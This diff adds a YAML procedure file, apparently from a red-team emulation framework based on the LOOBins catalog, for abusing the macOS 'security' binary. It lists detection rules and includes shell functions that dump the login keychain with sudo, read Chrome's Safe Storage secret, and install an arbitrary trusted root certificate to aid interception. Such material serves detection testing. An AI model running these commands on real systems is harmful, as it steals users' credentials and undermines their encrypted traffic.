@@ -1,0 +1,87 @@
+procedure_name: security
+tactic: Credential Access
+ttp_id: T9999
+guid: $GUID
+intent: Interact with Keychain, macOS's built-in password manager.
+author: '@darmado | https://x.com/darmad0'
+credit: 'LOOBins catalog author: Pratik Jeware (@Pratik-987), Brendan Chamberlain (@infosecb)'
+created: '2023-04-24'
+updated: $UPDATED
+version: 1.0.0
+platform:
+- darwin
+detection:
+- ioc: 'Sigma: Credentials from Password Stores - Keychain'
+  analysis: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml
+- ioc: 'Elastic: Access to Keychain Credentials Directories'
+  analysis: https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_credentials_keychains.toml
+- ioc: 'Elastic: Credential Access Dumping Keychain Security'
+  analysis: https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_dumping_keychain_security.toml
+- ioc: 'Elastic: Keychain Password Retrieval via Command Line'
+  analysis: https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_keychain_pwd_retrieval_security_cmd.toml
+- ioc: 'Jamf Protect: Detect Keychain dumping using security'
+  analysis: https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/keychain_dumped
+resources:
+- link: https://www.loobins.io/
+  description: LOOBins — Living Off The Orchard macOS binaries
+- link: ''
+  description: ''
+- link: https://www.netmeister.org/blog/keychain-passwords.html
+  description: Using the OS X Keychain to store and retrieve passwords
+- link: https://ss64.com/osx/security.html
+  description: SS64 security man page
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --dump-credentials-keys-certificates-and-other-senstive-information-from
+    description: This command will dump keychain passwords from login.keychain
+    execute_function:
+    - execute_dump_credentials_keys_certificates_other_senstive_information_from_keychain
+  - option: --retrieve-chrome-s-chrome-safe-storage-password-manager-secret
+    description: This command will retrieve the Chrome Safe Storage password manager secret from the keychain.
+    execute_function:
+    - execute_retrieve_chrome_s_chrome_safe_storage_password_manager_secret
+  - option: --add-an-arbitrary-trusted-certificate-to-aid-a-mitm-attack
+    description: This command will add a certificate to the keychain.
+    execute_function:
+    - execute_add_arbitrary_trusted_certificate_aid_mitm_attack
+  global_variable:
+  - name: CMD_SECURITY
+    type: string
+    default_value: /usr/bin/security
+  functions:
+  - name: execute_dump_credentials_keys_certificates_other_senstive_information_from_keychain
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_dump_credentials_keys_certificates_other_senstive_information_from_keychain() {\n    local result\n   \
+      \ result=$(sudo security dump-keychain -d login.keychain 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return\
+      \ 0\n}"
+  - name: execute_retrieve_chrome_s_chrome_safe_storage_password_manager_secret
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_retrieve_chrome_s_chrome_safe_storage_password_manager_secret() {\n    local result\n    result=$(security\
+      \ find-generic-password -w -s \"Chrome Safe Storage\" 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return\
+      \ 0\n}"
+  - name: execute_add_arbitrary_trusted_certificate_aid_mitm_attack
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_add_arbitrary_trusted_certificate_aid_mitm_attack() {\n    local result\n    result=$(security add-trusted-cert\
+      \ -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\
+      \n    return 0\n}"
